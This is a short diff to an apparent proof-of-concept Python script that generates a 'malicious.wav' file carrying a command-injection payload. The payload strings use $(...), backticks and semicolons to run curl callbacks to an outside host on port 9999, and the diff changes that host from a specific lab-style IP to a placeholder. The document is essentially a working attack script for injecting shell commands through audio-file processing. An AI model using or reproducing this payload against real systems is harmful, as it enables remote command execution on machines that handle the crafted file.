@@ -39,7 +39,7 @@ def generate_malicious_wav(payload_str):
     return riff_file
 
 if __name__ == '__main__':
-    payload = '$(curl http://10.10.16.247:9999/wav_payload_hit); curl http://10.10.16.247:9999/wav_payload_hit2 ; `curl http://10.10.16.247:9999/wav_payload_hit3`'
+    payload = '$(curl http://10.10.16.X:9999/wav_payload_hit); curl http://10.10.16.X:9999/wav_payload_hit2 ; `curl http://10.10.16.X:9999/wav_payload_hit3`'
     wav_bytes = generate_malicious_wav(payload)
     with open('malicious.wav', 'wb') as f:
         f.write(wav_bytes)
